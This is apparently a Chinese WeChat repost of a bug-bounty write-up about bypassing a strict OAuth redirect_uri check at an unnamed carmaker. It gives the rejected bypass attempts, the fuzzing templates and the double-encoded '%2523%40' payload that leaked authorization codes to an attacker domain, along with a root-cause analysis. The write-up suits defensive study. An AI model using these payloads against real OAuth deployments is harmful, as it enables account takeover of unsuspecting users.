---
title: 一次针对\"固若金汤\"的 OAuth redirect_uri 的攻破之旅
url: https://mp.weixin.qq.com/s/nIa61dE5NcQuCdN6IIUWuQ
source: Doonsec's feed
date: 2026-04-12
fetch_date: 2026-04-13T04:56:23.304370
---

# 一次针对\"固若金汤\"的 OAuth redirect_uri 的攻破之旅

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/lWEOEB1GOU3vCibxvdbicsyAsdkH1ZAeBNTcJGRtNbeLd3VQgoMaYvCjYib7WamStc07J4pLuj7GQ0vJVcrSplfmDH1PTAK9SONSQJkNCdlwaU/0?wx_fmt=jpeg)

# 一次针对"固若金汤"的 OAuth redirect\_uri 的攻破之旅

Voorivex
Voorivex

赛博知识驿站

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

说到漏洞挖掘，身份认证系统始终是 Voorivex 最钟爱的切入点。如今，大厂的认证体系往往层叠着无数实现细节和错综复杂的底层逻辑——每次深入测试，就像在拼一道充满未知变量的烧脑谜题。听起来不过是"测测登录"，实则是在数十个相互调用的 JS 文件和 `iframe` 之间反复穿梭、抽丝剥茧。

今天，Voorivex 要分享的，是他近期在某知名大厂主站上发现的一个**一键账户接管漏洞**。这家公司的安全防线，无论是内部红队还是外部猎人，几乎可以断定已经被反复审视过无数遍。

在正式揭秘之前，先来补一补 OAuth 流程的背景知识，以及为什么有些 OAuth 实现会比其他的难啃得多。

---

## SSO 与 OAuth 快速入门

单点登录（`SSO`）的核心理念很简单：**只需登录一次，即可畅行多个服务**。Google 就是最典型的例子——登录 Google 账号后，`Gmail`、`YouTube`、`Google Cloud` 全部自动打通，无需重复验证。

`SSO` 的实现方式各有千秋。有的公司依赖 `SAML` 或通用 OAuth 提供商；有的大型企业则选择自建私有 SSO 系统。正是这后一种情况，对漏洞猎人来说最为诱人——**定制化实现，往往意味着更高的出错概率**。

一次典型的 OAuth 登录流程是这样运转的：你打开某个网站，点击"使用 Google 登录"，幕后发生了以下这一切：

1. 1. **应用方**（如 `YouTube`）将你重定向至**身份提供商**（如 `Google`），并附带 `client_id`、`redirect_uri`、`scope`、`state` 等参数
2. 2. 你在提供商侧完成身份认证
3. 3. 提供商携带授权码（`code`）或令牌，将你重定向回应用方指定的 `redirect_uri`
4. 4. 应用方在服务端用该授权码换取访问令牌，并为用户签发认证 `Cookie`、会话或 Token

这里最关键的安全边界，就是 `redirect_uri`。**一旦攻击者能够操控授权码的去向，就能截获它、用它换取访问权限，进而接管受害者账户。** 这也是为什么每一家 OAuth 提供商都会对 `redirect_uri` 进行严格校验。

还有一个新手猎人常犯的认知误区：很多人热衷于攻击提供商侧（Google、Facebook 等）。但那些地方早已被数百万研究者翻了个底朝天。**真正的攻击面，在应用方**——具体来说，是应用方处理 OAuth 配置、发起重定向、完成令牌交换的那一整套逻辑。

---

## 两种重定向类型

在 OAuth 实现中，提供商回传授权码之后，通常存在两种重定向模式：

1. 1. **交换端点（Exchange Endpoint）**：服务端接收 `code` 并将其换成令牌或认证会话，通过 `301/302` 跳转完成，全程无 JavaScript 介入。这种模式下，唯一可操控的攻击向量就是 `redirect_uri`
2. 2. **调度端点（Dispatcher Endpoint）**：客户端页面通过 JavaScript 处理响应并完成跳转。这种模式更为复杂，也更容易藏雷——`state` 参数操控、`postMessage` 滥用、`window.location` 的 Unicode 解析差异，都可能成为突破口

第二种模式的攻击面更广，也往往更脆弱。Voorivex 此前就曾在 Google 旗下某产品的调度端点流程中挖出漏洞，斩获 **12,000 美元**的赏金，相关文章将在后续发布。

但如果 `redirect_uri` 是唯一可探测的漏洞点，而且实现看起来无懈可击，又该怎么办？

这正是 Voorivex 这次面临的处境。

---

## 目标的 OAuth 流程

目标公司是全球汽车行业的顶级玩家。他们搭建了一套统一的 OAuth 体系，由自研身份提供商驱动，为旗下多个子品牌共同提供服务。点击任意一个区域官网的"登录"按钮，都会触发如下 OAuth 请求：

```
https://idp-connect.company.com/auth/api/v2/user/authorize
  ?client_id=dummy
  &redirect_uri=https%3A%2F%2Fwww.company.com%2Fapi%2Fbin%2Fopenid%2Flogin
  &state=[BASE64_STATE]
  &scope=openid+profile+email+phone
  &response_type=code
  &ui_locales=en
```

认证完成后，提供商将用户重定向至：

```
https://www.company.com/api/bin/openid/login?code=AUTHORIZATION_CODE&state=...
```

这就是交换端点。应用方接收授权码，并将其换取用户会话。

---

## 攻击面分析

Voorivex 立刻着手梳理整个攻击面：

* • **应用方**：`www.company.com`
* • **提供商**：`idp-connect.company.com`
* • **交换端点**：`https://www.company.com/api/bin/openid/login`
* • **无调度端点**，无 JavaScript 介入，重定向是干净利落的 `301 HTTP` 跳转
* • **`state` 参数无法滥用**，因为它只是 Base64 编码的登录后跳转 URL，且交换端点在服务端处理

这意味着**唯一可行的攻击路径，就是操控 `redirect_uri`**。如果能让提供商把授权码重定向到攻击者控制的域名，那就大局已定。

问题在于：`redirect_uri` 的校验防护极为严密。不过，与 Google 主提供商不同的是，它同时接受子域名和主域名，因此 `abc.company.com` 这样的子域名能顺利通过安全校验函数：

```
redirect_uri=https%3A%2F%2Fabc.company.com%2Fapi%2Fbin%2Fopenid%2Flogin
```

但问题来了——解析器是如何识别子域名的？**答案是：解析 URL，或对其应用正则表达式。** 而这，恰恰是攻击者可以利用跨层解析差异打开缺口的地方，Voorivex 正是这么做的。

---

## 铜墙铁壁：每一招都被封死

Voorivex 从标准的 `redirect_uri` 操控技巧开始逐一尝试，结果无一例外，全部碰壁。

**路径混淆（`?` 与 `#`）：**

```
https://www.company.com?/api/bin/openid/login     → 拒绝
https://www.company.com#/api/bin/openid/login     → 拒绝
```

**域名替换：**

```
https://www.company.computer/api/bin/openid/login  → 拒绝
https://wwwa.company.com/api/bin/openid/login      → 拒绝
```

**`@` 符号注入：**

```
https://www.company.com@attacker.com/api/bin/openid/login   → 拒绝
```

**域名拼接：**

```
https://a.coma.company.computer/api/bin/openid/login    → 拒绝
https://a.com@.company.computer/api/bin/openid/login    → 拒绝
https://a.com\@.company.computer/api/bin/openid/login   → 拒绝
```

每一条常规绕过路径都被堵死。校验逻辑相当扎实。走到这一步，大多数猎人可能已经拍拍屁股转移目标了——`redirect_uri` 锁得死死的，看起来无从下手。

但 Voorivex 从不在第一轮尝试后就认输。他选择继续深挖。

---

## 模糊测试 URL 解析器

策略转变。与其反复套用已知的绕过姿势，不如直接对 URL 解析器发起模糊测试（`Fuzzing`）。核心问题只有一个：**某些字符在通过服务端 URL 校验器之后，是否还会被再次解码？**

Voorivex 开始对 URL 中各个位置的编码字符进行逐一测试（`\u0000` → `\u007f`）：

```
https://a.com%FUZZ.company.com/api/bin/openid/login
https://www.company.com%FUZZ/api/bin/openid/login
https://a.com%FUZZ/api/bin/openid/login
```

毫无斩获。于是他将 Fuzz 范围扩展到两个连续字符，对 `\u0000` 到 `\u007f` 的所有排列组合进行全覆盖——这种方式也被称为"集束炸弹攻击"（`Cluster Bomb`），不放过任何一种可能：

```
https://a.com%FUZZ%FUZZ.company.com/api/bin/openid/login
https://www.company.com%FUZZ%FUZZ/api/bin/openid/login
https://a.com%FUZZ%FUZZ/api/bin/openid/login
```

依然全部被拒。

此时，Voorivex 祭出了一个关键法宝——**经典的双重解码漏洞**（也称"双重编码攻击向量"，`Double-Encode Attack Vector`）。这个模式在 CTF 比赛中颇为常见，在真实场景中同样不可小觑。其原理在于：**如果服务端在校验前只解码一次，但执行跳转的函数在重定向前又触发了第二次解码，攻击者就能将特殊字符"夹带"过校验关卡**。

下面这段存在漏洞的 PHP 代码，直观展示了这一原理：

存在双重解码漏洞的 PHP 代码示例

看出漏洞了吗？Voorivex 随即将这套思路应用到目标上：

```
https://a.com%25FUZZ%FUZZ.company.com/api/bin/openid/login
https://www.company.com%25FUZZ%FUZZ/api/bin/openid/login
https://a.com%25FUZZ%FUZZ/api/bin/openid/login
```

这一次，`%2523%40` 给出了他期待已久的响应。

---

## 突破口

突破的关键，在于两个 URL 编码字符的精妙组合：

* • `%2523` = 双重编码的 `#`（第一次解码得到 `%23`，第二次解码得到 `#`）
* • `%40` = URL 编码的 `@`

Voorivex 构造了如下 `redirect_uri`：

```
https://a.com%2523%40www.company.com/api/bin/openid/login
```

下面逐步拆解这个 Payload 的运作机制：

**第一步：服务端校验**

服务器对 URL 进行一次解码：

```
https://a.com%23@www.company.com/api/bin/openid/login
```

校验器看到的是 `%23`（即 `#`）紧跟着 `@www.company.com`。在 URL 解析规则中，`@` 符号用于分隔凭据与主机名，因此服务器将其解读为：

* • 凭据：`a.com%23`（被视为用户凭据，直接忽略）
* • 主机：`www.company.com`
* • 路径：`/api/bin/openid/login`

主机识别为 `www.company.com`，**校验通过**。

**第二步：301 重定向前的最后一刻**

服务器准备发出 `301` 跳转，并将授权码附加到 URL 上。在参数传入响应之前，某个函数对 `%23` 执行了一次额外解码：

```
https://a.com#@www.company.com/api/bin/openid/login?code=AUTH_CODE
```

此刻浏览器接收到的 URL 结构变成了：

* • 协议：`https`
* • 主机：**`a.com`**
* • 片段标识符：`@www.company.com/api/bin/openid/login?code=AUTH_CODE`

`#` 之后的所有内容，都成了片段标识符（`Fragment`）。浏览器导航至 `a.com`，攻击者的页面通过 `location.hash` 即可读取到完整的授权码。

**授权码，就这样泄露给了攻击者。**

在实际的攻击场景中，最终的重定向形如：

```
https://a.com/?code=AUTH_CODE&state=...
```

授权码已落入囊中。

---

## 漏洞根因分析

这个漏洞的根源，是**服务端 URL 校验器的解析逻辑**与**重定向前某个解码函数的行为**之间的不一致性。具体来说：

1. 1. 服务端在校验 `redirect_uri` 之前，执行了**一轮** URL 解码——这是标准行为
2. 2. 在执行重定向之前，某个函数**又触发了一轮额外的解码**
3. 3. 双重编码的字符（如 `#` 对应的 `%2523`）在第一次解码后变为 `%23`，顺利通过校验；在第二次解码后还原为 `#`，彻底改变了 URL 的结构语义

这绝非一个触手可及的低级漏洞。`redirect_uri` 的校验本身相当强健，封堵了所有常规绕过手法。真正的致命伤，藏在服务端 URL 解码行为与安全校验函数之间那道隐秘的裂缝里。

这个案例有力地说明了一件事：**"完全安全"从来不等于"无法突破"，它只是意味着需要更深入的探索。** 希望这篇文章对你有所启发。Voorivex 的下一篇将聚焦 Google 的 OAuth 机制，探索带有调度端点的另一条攻击路径，敬请期待。

> 原文:https://blog.voorivex.team/story-of-abusing-a-fully-secured-redirect-uri-in-an-oauth-flow

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MuPQsYZPics7z8lAkKtZibjiaY6En5gG1D4EgtI6lKhficVFBQzZtSkqbvOd1de8B7MfuJjEiccMypHhJFQfF00Erxg/0?wx_fmt=png)

赛博知识驿站

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MuPQsYZPics7z8lAkKtZibjiaY6En5gG1D4EgtI6lKhficVFBQzZtSkqbvOd1de8B7MfuJjEiccMypHhJFQfF00Erxg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过